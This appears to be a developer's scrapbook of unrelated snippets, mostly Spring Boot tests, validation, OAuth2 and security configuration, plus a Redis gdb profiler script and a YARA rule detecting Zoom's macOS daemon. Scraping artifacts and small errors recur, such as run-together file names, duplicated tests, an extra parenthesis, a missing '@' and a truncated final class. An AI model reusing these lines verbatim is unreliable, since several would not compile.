Message message = Json.serializer().fromNode(node, new TypeReference<Message>() {});
--------------------------------------------------------------------------------------------------------
@Component
@Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)
public class MyBean {

    @InjectRandomInt
    private int value1;

    @InjectRandomInt(min = 100, max = 200)
    private int value2;

    private int value3;

    @Override
    public String toString() {
        return "MyBean{" +
                "value1=" + value1 +
                ", value2=" + value2 +
                ", value3=" + value3 +
                '}';
    }
}
--------------------------------------------------------------------------------------------------------
#' @importFrom utils savehistory

get_history_tail <- function(n) {
  savehistory(tmp <- tempfile())
  on.exit(unlink(tmp))
  tail(readLines(tmp), n)
}

drop_comment_char <- function(x) {
  sub("^(\\s*git\\s+)#?", "\\1", x)
}

echo_command <- function(x) {
  ## Current prompt, can be multiple lines, take the last
  pr <- tail(strsplit(getOption("prompt"), "\n")[[1]], 1)
  cat(pr, x, "\n", sep = "")
}

find_parent <- function(name, pkg = NULL) {
  if (!is.null(pkg)) name <- call("::", pkg, name)
  calls <- sys.calls()
  for (i in seq_along(calls)) {
    if (identical(calls[[i]][[1]], name)) return(i)
  }
  NA_integer_
}
--------------------------------------------------------------------------------------------------------
private rule Macho
{
    meta:
        description = "private rule to match Mach-O binaries (copied from Apple's XProtect)"
    condition:
        uint32(0) == 0xfeedface or uint32(0) == 0xcefaedfe or uint32(0) == 0xfeedfacf or uint32(0) == 0xcffaedfe or uint32(0) == 0xcafebabe or uint32(0) == 0xbebafeca
}

rule ZoomDaemon
{
    meta:
        description = "ZoomDaemon and its whitelabels"
    strings:
        $ = "zLocalHostWrapper"
        $ = "ZMClientHelper"
        $ = "ZMLocalHostMgr"
    condition:
        Macho and all of them
}
--------------------------------------------------------------------------------------------------------
//        final StringBuilder sb = new StringBuilder();
//        sb.append("From: foo@bar.com\r\n");
//        sb.append("To: someone@else.com\r\n");
//        sb.append("Final-Recipient: someone@else.com\r\n");
//        sb.append("Diagnostic-Code: 4.4.2\r\n");
//        sb.append("Content-type: message/delivery-status\r\n");
//        sb.append("\r\n");
//        sb.append("This is the preamble.\r\n");
//        sb.append("--boundary\r\n");
//        sb.append("Content-type: text/plain\r\n");
//        sb.append("\r\n");
//        sb.append("This is the first body.\r\n");
//        sb.append("It's completely meaningless.\r\n");
//        sb.append("After this line the body ends.\r\n");
//        sb.append("\r\n");
//        sb.append("--boundary--\r\n");
//        return "From: foo@bar.com\r\n" +
//                "To: someone@else.com\r\n" +
//                "Final-Recipient: someone@else.com\r\n" +
//                "Diagnostic-Code: 4.4.2\r\n" +
//                "Content-type: message/delivery-status\r\n" +
//                "\r\n" +
//                "This is the preamble.\r\n" +
//                "--boundary\r\n" +
//                "Content-type: text/plain\r\n" +
//                "\r\n" +
//                "This is the first body.\r\n" +
//                "It's completely meaningless.\r\n" +
//                "After this line the body ends.\r\n" +
//                "\r\n" +
//                "--boundary--\r\n";

--------------------------------------------------------------------------------------------------------
# This script is from http://poormansprofiler.org/
#
# NOTE: Instead of using this script, you should use the Redis
# Software Watchdog, which provides a similar functionality but in
# a more reliable / easy to use way.
#
# Check http://redis.io/topics/latency for more information.

#!/bin/bash
nsamples=1
sleeptime=0
pid=$(ps auxww | grep '[r]edis-server' | awk '{print $2}')

for x in $(seq 1 $nsamples)
  do
    gdb -ex "set pagination 0" -ex "thread apply all bt" -batch -p $pid
    sleep $sleeptime
  done | \
awk '
  BEGIN { s = ""; } 
  /Thread/ { print s; s = ""; } 
  /^\#/ { if (s != "" ) { s = s "," $4} else { s = $4 } } 
  END { print s }' | \
sort | uniq -c | sort -r -n -k 1,1
--------------------------------------------------------------------------------------------------------
git lfs install
git lfs track "*.psd"
git add .gitattributes

git add file.psd
git commit -m "Add design file"
git push origin master
--------------------------------------------------------------------------------------------------------
server:
  port: ${random:int(4)}
  
java -jar spring-boot-app.jar -Dserver.port=2020
--------------------------------------------------------------------------------------------------------
tLanguages_null_shouldReturnOk()Java
@Test
public void getLanguages_null_shouldReturnOk() throws Exception {
  // Given
  final Language mockedEsoteric = new Language("Arnoldc", "Lauri Hartikka");
  final List<Language> mockedLanguages = Stream.concat(
      LanguageRepository.LANGUAGES.stream(),
      Stream.of(mockedEsoteric)).collect(Collectors.toList());
  doReturn(mockedLanguages).when(languageService).getLanguages(null);

  // When
  final ResultActions result = mockMvc.perform(
      get("/api/languages")
          .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));

  // Then
  result.andExpect(status().isOk());
  result.andExpect(jsonPath("$.length()").value(mockedLanguages.size()));
  result.andExpect(jsonPath("$[?(@.name === 'Arnoldc')]").exists());
}

@Test
public void getLanguages_null_shouldReturnOk() throws Exception {
  // Given
  final Language mockedEsoteric = new Language("Arnoldc", "Lauri Hartikka");
  final List<Language> mockedLanguages = Stream.concat(
      LanguageRepository.LANGUAGES.stream(),
      Stream.of(mockedEsoteric)).collect(Collectors.toList());
  doReturn(mockedLanguages).when(languageService).getLanguages(null);
 
  // When
  final ResultActions result = mockMvc.perform(
      get("/api/languages")
          .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));
 
  // Then
  result.andExpect(status().isOk());
  result.andExpect(jsonPath("$.length()").value(mockedLanguages.size()));
  result.andExpect(jsonPath("$[?(@.name === 'Arnoldc')]").exists());
}
--------------------------------------------------------------------------------------------------------
@Autowired
private MockMvc mvc;
 
@Test
public void getAllEmployeesAPI() throws Exception
{
  mvc.perform( MockMvcRequestBuilders
      .get("/employees")
      .accept(MediaType.APPLICATION_JSON))
      .andDo(print())
      .andExpect(status().isOk())
      .andExpect(MockMvcResultMatchers.jsonPath("$.employees").exists())
      .andExpect(MockMvcResultMatchers.jsonPath("$.employees[*].employeeId").isNotEmpty());
}
 
@Test
public void getEmployeeByIdAPI() throws Exception
{
  mvc.perform( MockMvcRequestBuilders
      .get("/employees/{id}", 1)
      .accept(MediaType.APPLICATION_JSON))
      .andDo(print())
      .andExpect(status().isOk())
      .andExpect(MockMvcResultMatchers.jsonPath("$.employeeId").value(1));
}
--------------------------------------------------------------------------------------------------------
@EnableAutoConfiguration(
        exclude = {
                IntegrationAutoConfiguration.class,
                RedisAutoConfiguration.class,
                RedisRepositoriesAutoConfiguration.class,
                MailSenderValidatorAutoConfiguration.class
        }
)
--------------------------------------------------------------------------------------------------------
@Test
public void getLanguage_nonExistingLanguage_shouldReturnNotFound() throws Exception {
  // Given
  final String mockedLanguageName = "Arnoldc";
  doReturn(Optional.empty()).when(languageService).getLanguage(mockedLanguageName);

  // When
  final ResultActions result = mockMvc.perform(
      get("/api/languages/".concat(mockedLanguageName))
          .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));

  // Then
  result.andExpect(status().isNotFound());
}

@Test
public void getLanguage_nonExistingLanguage_shouldReturnNotFound() throws Exception {
  // Given
  final String mockedLanguageName = "Arnoldc";
  doReturn(Optional.empty()).when(languageService).getLanguage(mockedLanguageName);
 
  // When
  final ResultActions result = mockMvc.perform(
      get("/api/languages/".concat(mockedLanguageName))
          .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));
 
  // Then
  result.andExpect(status().isNotFound());
}
--------------------------------------------------------------------------------------------------------
@Test
public void getLanguages_invalidAcceptHeader_shouldReturnNotAcceptable() throws Exception {
  // Given
  final String invalidAcceptMimeType = MimeTypeUtils.APPLICATION_XML_VALUE;
  doReturn(LanguageRepository.LANGUAGES).when(languageService).getLanguages(null);
 
  // When
  final ResultActions result = mockMvc.perform(
      get("/api/languages")
          .accept(invalidAcceptMimeType));
 
  // Then
  result.andExpect(status().isNotAcceptable());
}
--------------------------------------------------------------------------------------------------------
guageApiControllerApplicationIntegrationTest.javaJava
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = {
    SpringMockMvcConfiguration.class
})
public class LanguageApiControllerApplicationIntegrationTest {

  @Autowired
  private WebApplicationContext webApplicationContext;

  private MockMvc mockMvc;

  @Before
  public void setUp() {
    mockMvc = MockMvcBuilders
        .webAppContextSetup(webApplicationContext)
        .build();
  }
/*...*/
  @Test
  public void getLanguages_null_shouldReturnOk() throws Exception {
    // Given
    // Real application context

    // When
    final ResultActions result = mockMvc.perform(
        get("/api/languages")
            .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));

    // Then
    final int expectedSize = LANGUAGES.size();
    final String[] expectedLanguageNames = LANGUAGES.stream().map(Language::getName)
        .collect(Collectors.toList()).toArray(new String[LANGUAGES.size()]);
    result.andExpect(status().isOk());
    result.andExpect(jsonPath("$.length()").value(expectedSize));
    result.andExpect(jsonPath("$[*].name", containsInAnyOrder(expectedLanguageNames)));
  }

}

guageApiControllerTest.javaJava
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes = {
    LanguageApiController.class
})
@Import(Config.class)
public class LanguageApiControllerTest {

  @Autowired
  private LanguageService languageService;

  @Autowired
  private LanguageApiController languageApiController;

  private MockMvc mockMvc;

  @Before
  public void setUp() {
    mockMvc = MockMvcBuilders
        .standaloneSetup(languageApiController)
        .build();
  }

/* ... */

  @TestConfiguration
  protected static class Config {

    @Bean
    public LanguageService languageService() {
      return Mockito.mock(LanguageService.class);
    }

  }

}


@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes = {
    LanguageApiController.class
})
@Import(Config.class)
public class LanguageApiControllerTest {
 
  @Autowired
  private LanguageService languageService;
 
  @Autowired
  private LanguageApiController languageApiController;
 
  private MockMvc mockMvc;
 
  @Before
  public void setUp() {
    mockMvc = MockMvcBuilders
        .standaloneSetup(languageApiController)
        .build();
  }
 
/* ... */
 
  @TestConfiguration
  protected static class Config {
 
    @Bean
    public LanguageService languageService() {
      return Mockito.mock(LanguageService.class);
    }
 
  }
 
}


@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = {
    SpringMockMvcConfiguration.class
})
public class LanguageApiControllerApplicationIntegrationTest {
 
  @Autowired
  private WebApplicationContext webApplicationContext;
 
  private MockMvc mockMvc;
 
  @Before
  public void setUp() {
    mockMvc = MockMvcBuilders
        .webAppContextSetup(webApplicationContext)
        .build();
  }
/*...*/
  @Test
  public void getLanguages_null_shouldReturnOk() throws Exception {
    // Given
    // Real application context
 
    // When
    final ResultActions result = mockMvc.perform(
        get("/api/languages")
            .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));
 
    // Then
    final int expectedSize = LANGUAGES.size();
    final String[] expectedLanguageNames = LANGUAGES.stream().map(Language::getName)
        .collect(Collectors.toList()).toArray(new String[LANGUAGES.size()]);
    result.andExpect(status().isOk());
    result.andExpect(jsonPath("$.length()").value(expectedSize));
    result.andExpect(jsonPath("$[*].name", containsInAnyOrder(expectedLanguageNames)));
  }
 
}

@RunWith(SpringRunner.class)
@WebMvcTest(controllers = LanguageApiController.class)
public class LanguageApiControllerWebMvcTest {
 
  @Autowired
  private MockMvc mockMvc;
 
  @Test
  public void getLanguages_null_shouldReturnOk() throws Exception {
    // Given
    // Real application context
 
    // When
    final ResultActions result = mockMvc.perform(
        get("/api/languages")
            .accept(MimeTypeUtils.APPLICATION_JSON_VALUE));
 
    // Then
    final int expectedSize = LANGUAGES.size();
    final String[] expectedLanguageNames = LANGUAGES.stream().map(Language::getName)
        .collect(Collectors.toList()).toArray(new String[LANGUAGES.size()]);
    result.andExpect(status().isOk());
    result.andExpect(jsonPath("$.length()").value(expectedSize));
    result.andExpect(jsonPath("$[*].name", containsInAnyOrder(expectedLanguageNames)));
  }
}
--------------------------------------------------------------------------------------------------------
  public void getLanguages_null_shouldReturnListOfStrings() throws Exception {
    // Given
    final String mockedEsoteric = "Arnoldc";
    final List<String> mockedLanguages = Stream.concat(
        LanguageRepository.LANGUAGES.stream(),
        Stream.of(mockedEsoteric)).collect(Collectors.toList());
    doReturn(mockedLanguages).when(languageService).getLanguages(null);
 
    // When
    final ResponseEntity<List<String>> result = languageApiController.getLanguages(null);
 
    // Then
    assertThat(result.getBody(), hasSize(mockedLanguages.size()));
    assertThat(result.getBody(), hasItem(mockedEsoteric));
  }
}
--------------------------------------------------------------------------------------------------------
@Test
public final void givenUsingTempFile_whenConvertingAnInputStreamToAString_thenCorrect() 
  throws IOException {
    String originalString = randomAlphabetic(DEFAULT_SIZE);
    InputStream inputStream = new ByteArrayInputStream(originalString.getBytes());
 
    Path tempFile = Files.createTempDirectory("").resolve(UUID.randomUUID().toString() + ".tmp");
    Files.copy(inputStream, tempFile, StandardCopyOption.REPLACE_EXISTING);
    String result = new String(Files.readAllBytes(tempFile));
 
    assertThat(result, equalTo(originalString));
}
@Test
public final void givenUsingPlainJava_whenConvertingAnInputStreamToString_thenCorrect()
  throws IOException {
    String originalString = randomAlphabetic(8);
    InputStream inputStream = new ByteArrayInputStream(originalString.getBytes());
 
    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
    int nRead;
    byte[] data = new byte[1024];
    while ((nRead = inputStream.read(data, 0, data.length)) != -1) {
        buffer.write(data, 0, nRead);
    }
 
    buffer.flush();
    byte[] byteArray = buffer.toByteArray();
         
    String text = new String(byteArray, StandardCharsets.UTF_8);
    assertThat(text, equalTo(originalString));
}

@Test
public void givenUsingJava7_whenConvertingAnInputStreamToAString_thenCorrect() 
  throws IOException {
    String originalString = randomAlphabetic(8);
    InputStream inputStream = new ByteArrayInputStream(originalString.getBytes());
 
    String text = null;
    try (Scanner scanner = new Scanner(inputStream, StandardCharsets.UTF_8.name())) {
        text = scanner.useDelimiter("\\A").next();
    }
 
    assertThat(text, equalTo(originalString));
}
@Test
public void givenUsingJava5_whenConvertingAnInputStreamToAString_thenCorrect() 
  throws IOException {
    String originalString = randomAlphabetic(DEFAULT_SIZE);
    InputStream inputStream = new ByteArrayInputStream(originalString.getBytes());
 
    StringBuilder textBuilder = new StringBuilder();
    try (Reader reader = new BufferedReader(new InputStreamReader
      (inputStream, Charset.forName(StandardCharsets.UTF_8.name())))) {
        int c = 0;
        while ((c = reader.read()) != -1) {
            textBuilder.append((char) c);
        }
    }
    assertEquals(textBuilder.toString(), originalString);
}
@Test
public void givenUsingCommonsIoWithCopy_whenConvertingAnInputStreamToAString_thenCorrect() 
  throws IOException {
    String originalString = randomAlphabetic(8);
    InputStream inputStream = new ByteArrayInputStream(originalString.getBytes());
 
    StringWriter writer = new StringWriter();
    String encoding = StandardCharsets.UTF_8.name();
    IOUtils.copy(inputStream, writer, encoding);
 
    assertThat(writer.toString(), equalTo(originalString));
}
@Test
public void givenUsingCommonsIo_whenConvertingAnInputStreamToAString_thenCorrect() 
  throws IOException {
    String originalString = randomAlphabetic(8);
    InputStream inputStream = new ByteArrayInputStream(originalString.getBytes());
 
    String text = IOUtils.toString(inputStream, StandardCharsets.UTF_8.name());
    assertThat(text, equalTo(originalString));
}
@Test
public void givenUsingGuavaAndJava7_whenConvertingAnInputStreamToAString_thenCorrect() 
  throws IOException {
    String originalString = randomAlphabetic(8);
    InputStream inputStream = new ByteArrayInputStream(originalString.getBytes());
  
    String text = null;
    try (final Reader reader = new InputStreamReader(inputStream)) {
        text = CharStreams.toString(reader);
    }
  
    assertThat(text, equalTo(originalString));
}
Test
public void givenUsingGuava_whenConvertingAnInputStreamToAString_thenCorrect() 
  throws IOException {
    String originalString = randomAlphabetic(8);
    InputStream inputStream = new ByteArrayInputStream(originalString.getBytes());
 
    ByteSource byteSource = new ByteSource() {
        @Override
        public InputStream openStream() throws IOException {
            return inputStream;
        }
    };
 
    String text = byteSource.asCharSource(Charsets.UTF_8).read();
 
    assertThat(text, equalTo(originalString));
}

this.getClass().getClassLoader().getResourceAsStream(myfile.txt);
--------------------------------------------------------------------------------------------------------
package com.company.project.components;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.MessageSource;
import org.springframework.context.support.MessageSourceAccessor;
import org.springframework.stereotype.Component;

import javax.annotation.PostConstruct;
import java.util.Locale;

/**
 * Helper to simplify accessing i18n messages in code.
 * 
 * This finds messages automatically found from src/main/resources (files named messages_*.properties)
 * 
 * This example uses hard-coded English locale.
 *
 * @author Joni Karppinen
 * @since 2015-11-02
 */
@Component
public class Messages {

    @Autowired
    private MessageSource messageSource;

    private MessageSourceAccessor accessor;

    @PostConstruct
    private void init() {
        accessor = new MessageSourceAccessor(messageSource, Locale.ENGLISH);
    }

    public String get(String code) {
        return accessor.getMessage(code);
    }

}
 messages_en.properties
default.title = Title
 SomeServiceImpl.java
package com.company.project.services;

import com.company.project.components.Messages;
import org.springframework.beans.factory.annotation.Autowired;

@Service
public class SomeServiceImpl implements SomeService {

    @Autowired
    Messages messages;
    
    // ... 
   
    private String getDefaultTitle() {
        return messages.get("default.title"));
    }

}
--------------------------------------------------------------------------------------------------------
@Test
public void testOptionalUnwrappedExecutableReturnValue() throws Exception {
    ExecutableValidator executableValidator = validator.forExecutables();
    Method method = Foo.class.getMethod("getOptionalLong");
    Set<ConstraintViolation<Foo>> constraintViolations = executableValidator.validateReturnValue(new Foo(), method, Optional.of(9L));
    assertNumberOfViolations(constraintViolations, 1);
    assertCorrectPropertyPaths(constraintViolations, "getOptionalLong.<return value>");
    assertCorrectConstraintTypes(constraintViolations, Max.class);
}
--------------------------------------------------------------------------------------------------------
@SupportedValidationTarget({ValidationTarget.ANNOTATED_ELEMENT, ValidationTarget.PARAMETERS})

@ZipCodeCoherenceChecker(groups = Address.HighLevelCoherence.class)
public class Address {
@NotNull @Size(max = 50)
private String street1;
@NotNull @ZipCode
private String zipcode;
@NotNull @Size(max = 30)
private String city;
/**
* check coherence on the overall object
* Needs basic checking to be green first
*/
public interface HighLevelCoherence {}
/**
* check both basic constraints and high level ones.
* high level constraints are not checked if basic constraints fail
*/
@GroupSequence({Default.class, HighLevelCoherence.class})
public interface Complete {}
}

public class User {
@Valid
@ConvertGroup.List( {
@ConvertGroup(from=Default.class, to=BasicPostal.class),
@ConvertGroup(from=Complete.class, to=FullPostal.class)
} )
Set<Address> getAddresses() { [...] }
}

@Controller
@RequestMapping("user")
public class UserController {

    @Inject
    SmartValidator smartValidator; // (1)

    // omitted

    @RequestMapping(value = "create", method = RequestMethod.POST, params = "confirm")
    public String createConfirm(/* (2) */ UserForm form, BindingResult result) {
        // (3)
        Class<?> validationGroup = Default.class;
        // logic to determine validation group
        // if (xxx) {
        //     validationGroup = Xxx.class;
        // }
        smartValidator.validate(form, result, validationGroup); // (4)
        if (result.hasErrors()) {
            return "user/createForm";
        }
        return "user/createConfirm";
    }
}

https://terasolunaorg.github.io/guideline/5.2.0.RELEASE/en/ArchitectureInDetail/WebApplicationDetail/Validation.html

// omitted
public class ConfirmValidator implements ConstraintValidator<Confirm, Object> {
    private String field;

    private String confirmField;

    private String message;

    public void initialize(Confirm constraintAnnotation) {
        // omitted
    }

    public boolean isValid(Object value, ConstraintValidatorContext context) {
        // omitted
        if (matched) {
            return true;
        } else {
            context.disableDefaultConstraintViolation();

            //new ConstraintViolation to be generated for field
            context.buildConstraintViolationWithTemplate(message)
                    .addPropertyNode(field).addConstraintViolation();

            //new ConstraintViolation to be generated for confirmField
            context.buildConstraintViolationWithTemplate("") // (1)
                    .addPropertyNode(confirmField).addConstraintViolation();

            return false;
        }
    }

}

import java.io.Serializable;

import javax.validation.constraints.NotNull;
import javax.validation.constraints.Size;

import com.example.common.validation.Confirm;

@Confirm(field = "password") // (1)
public class PasswordResetForm implements Serializable {
    private static final long serialVersionUID = 1L;

    @NotNull
    @Size(min = 8)
    private String password;

    private String confirmPassword;

    // omitted getter/setter
}

<dependencies>
    <dependency>
        <groupId>org.terasoluna.gfw</groupId>
        <artifactId>terasoluna-gfw-validator</artifactId>
    </dependency>
</dependencies>

@Controller
@RequestMapping("xxx")
public class XxxController {

    @InitBinder
    public void initBinder(WebDataBinder binder) {
        // bind empty strings as null
        binder.registerCustomEditor(String.class, new StringTrimmerEditor(true));
    }

    // omitted ...
}

    @RequestMapping("addPerson2")

    public List<String> addPerson(@Validated final Person person, BindingResult result) {

        if(result.hasErrors()) {
            List<ObjectError> errorList = result.getAllErrors();
            List<String> messageList = new ArrayList<>();
            errorList.forEach(e -> messageList.add(e.getDefaultMessage()));
            return messageList;
        }
        return null;
    }
--------------------------------------------------------------------------------------------------------
@ConditionalOnExpression("${module.enabled:true} and ${module.submodule.enabled:true}")
--------------------------------------------------------------------------------------------------------
$ pip install -U os-urlpattern
$ wget -qO- 'https://git.io/f4QlP' | pattern-make
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@AutoConfigureTestDatabase(replace = Replace.NONE)
@DataJpaTest
@ContextConfiguration(classes = {YourBeans.class, MoreOfYourBeans.class})
public class UserRepoTest {

  @Autowired
  private UserRepo userRepo = null;

  @Autowired
  private TestEntityManager entityManager = null;
--------------------------------------------------------------------------------------------------------
org.springframework.boot.autoconfigure.EnableAutoConfiguration=\
org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\
... (100 lines)
org.springframework.boot.autoconfigure.webservices.WebServicesAutoConfiguration
--------------------------------------------------------------------------------------------------------
java -jar my-app.jar --debug
--------------------------------------------------------------------------------------------------------
	/**
	 * H2 Database Connection.
	 */
	H2(EmbeddedDatabaseType.H2, "org.h2.Driver", "jdbc:h2:mem:%s;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE"),

	/**
	 * Derby Database Connection.
	 */
	DERBY(EmbeddedDatabaseType.DERBY, "org.apache.derby.jdbc.EmbeddedDriver", "jdbc:derby:memory:%s;create=true"),

	/**
	 * HSQL Database Connection.
	 */
	HSQL(EmbeddedDatabaseType.HSQL, "org.hsqldb.jdbcDriver", "jdbc:hsqldb:mem:%s");
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.ImportResource;
/**
 * Created by jt on 3/28/15.
 */
@SpringBootApplication
@ImportResource("classpath*:spring/spring-config.xml")
public class XmlApplication {
    public static void main(String[] args) {
        ApplicationContext ctx = SpringApplication.run(XmlApplication.class, args);
        XmlBean bean = (XmlBean) ctx.getBean("xmlBean");
        bean.sayHello();
    }
}
--------------------------------------------------------------------------------------------------------
import java.util.Arrays;
 
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.support.SpringBootServletInitializer;
import org.springframework.context.ApplicationContext;
 
@SpringBootApplication
public class SpringBootWebApplication extends SpringBootServletInitializer implements CommandLineRunner {
 
    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
        return application.sources(SpringBootWebApplication.class);
    }
 
    public static void main(String[] args) throws Exception {
        SpringApplication.run(SpringBootWebApplication.class, args);
    }
     
    @Autowired
    private ApplicationContext appContext;
     
    @Override
    public void run(String... args) throws Exception
    {
        String[] beans = appContext.getBeanDefinitionNames();
        Arrays.sort(beans);
        for (String bean : beans)
        {
            System.out.println(bean + " of Type :: " + appContext.getBean(bean).getClass());
        }
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

import javax.sql.DataSource;

@EnableWebSecurity
@Configuration
public class ServerSecurityConfig extends WebSecurityConfigurerAdapter {

    private DataSource dataSource;

    @Autowired
    public void setDataSource(DataSource dataSource) {
        this.dataSource = dataSource;
    }

    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
        auth.jdbcAuthentication().dataSource(dataSource).passwordEncoder(passwordEncoder())
                .usersByUsernameQuery(
                        "select username,password, is_active from custm_prefix_users where username=?")
                .authoritiesByUsernameQuery(
                        "select username, role from custm_prefix_user_roles where username=?");
    }

    @Bean
    public PasswordEncoder passwordEncoder(){
        return new BCryptPasswordEncoder();
    }

    @Override
    @Bean
    public AuthenticationManager authenticationManagerBean()
            throws Exception {
        return super.authenticationManagerBean();
    }

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.authorizeRequests()
                .and()
                .formLogin().permitAll();
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.oauth2.config.annotation.configurers.ClientDetailsServiceConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configuration.AuthorizationServerConfigurerAdapter;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableAuthorizationServer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerEndpointsConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerSecurityConfigurer;
import org.springframework.security.oauth2.provider.token.TokenEnhancer;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.JdbcTokenStore;

import javax.sql.DataSource;

@Configuration
@EnableAuthorizationServer
@ConfigurationProperties(prefix = "datasource")
public class AuthorizationServerConfiguration extends AuthorizationServerConfigurerAdapter {

    private DataSource dataSource;

    @Autowired
    @Qualifier("authenticationManagerBean")
    private AuthenticationManager authenticationManager;

    @Autowired
    public void setDataSource(DataSource dataSource) {
        this.dataSource = dataSource;
    }

    @Override
    public void configure(AuthorizationServerSecurityConfigurer oauthServer) throws Exception {
        oauthServer
                .tokenKeyAccess("permitAll()")
                .checkTokenAccess("isAuthenticated()");
    }

    @Override
    public void configure(ClientDetailsServiceConfigurer clients) throws Exception {
        clients.jdbc(dataSource);
    }

    @Override
    public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception {
        endpoints.tokenStore(tokenStore()).tokenEnhancer(tokenEnhancer()).authenticationManager(authenticationManager);
    }

    @Bean
    public TokenStore tokenStore() {
        return new JdbcTokenStore(dataSource);
    }

}
--------------------------------------------------------------------------------------------------------
drop table if exists oauth_client_details;
create table oauth_client_details (
  client_id VARCHAR(255) PRIMARY KEY,
  resource_ids VARCHAR(255),
  client_secret VARCHAR(255),
  scope VARCHAR(255),
  authorized_grant_types VARCHAR(255),
  web_server_redirect_uri VARCHAR(255),
  authorities VARCHAR(255),
  access_token_validity INTEGER,
  refresh_token_validity INTEGER,
  additional_information VARCHAR(4096),
  autoapprove VARCHAR(255)
);

drop table if exists oauth_client_token;
create table oauth_client_token (
  token_id VARCHAR(255),
  token LONG VARBINARY,
  authentication_id VARCHAR(255) PRIMARY KEY,
  user_name VARCHAR(255),
  client_id VARCHAR(255)
);

drop table if exists oauth_access_token;
create table oauth_access_token (
  token_id VARCHAR(255),
  token LONG VARBINARY,
  authentication_id VARCHAR(255) PRIMARY KEY,
  user_name VARCHAR(255),
  client_id VARCHAR(255),
  authentication LONG VARBINARY,
  refresh_token VARCHAR(255)
);

drop table if exists oauth_refresh_token;
create table oauth_refresh_token (
  token_id VARCHAR(255),
  token LONG VARBINARY,
  authentication LONG VARBINARY
);

drop table if exists oauth_code;
create table oauth_code (
  code VARCHAR(255), authentication LONG VARBINARY
);

drop table if exists oauth_approvals;
create table oauth_approvals (
    userId VARCHAR(255),
    clientId VARCHAR(255),
    scope VARCHAR(255),
    status VARCHAR(10),
    expiresAt TIMESTAMP,
    lastModifiedAt TIMESTAMP
);

CREATE TABLE IF NOT EXISTS custom_prefix_users
(
  id integer NOT NULL,
  username character varying(100) NOT NULL,
  password character varying(100) NOT NULL,
  is_active smallint NOT NULL DEFAULT 1,
  CONSTRAINT users_id_key PRIMARY KEY (id),
  CONSTRAINT username_unique UNIQUE (username)
);

CREATE TABLE IF NOT EXISTS custom_prefix_user_roles
(
  id integer NOT NULL,
  username character varying(100) NOT NULL REFERENCES custom_prefix_users (username),
  role character varying(100) NOT NULL,
  CONSTRAINT usroles_id_key PRIMARY KEY (id),
  CONSTRAINT rolname_unique UNIQUE (role,username)
);
--------------------------------------------------------------------------------------------------------

    User theUser = loggedInUser.getUser();  
    User user = (User) em.createQuery("from User u where u.email = :email").setParameter("email", theUser.getEmail()).getSingleResult();  
    List<Booking> bookings = user.getBookings();  
    if (bookings == null) {  
         bookings = new ArrayList<Booking>();  
    }  
    bookings.add(booking);  
    user.setBookings(bookings);  
    em.persist(user); 
--------------------------------------------------------------------------------------------------------
    private static final String[] WEBJARS_RESOURCE_LOCATIONS = {
            "classpath:/META-INF/resources/webjars/"
    };
    private static final String[] SWAGGER_RESOURCE_LOCATIONS = {
            "classpath:/META-INF/resources/",
            "classpath:/resources/",
            "classpath:/static/",
            "classpath:/public/"
    };
--------------------------------------------------------------------------------------------------------
psql -f demo.sql -U postgres
psql -f demo.sql -U postgres > demo.log 2>demo.err
psql -f demo.sql -U postgres > demo.log 2>&1 & 
tail -f demo.log
psql -d demo -U postgres

\dt
\d students
\h create table

explain (costs off) select * from <table>

set enable_hashjoin = off;
set enable_mergejoin = off;
set enable_nestloop = off;


--------------------------------------------------------------------------------------------------------
http://www.bytestree.com/

import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;

@Configuration
@EnableWebMvc
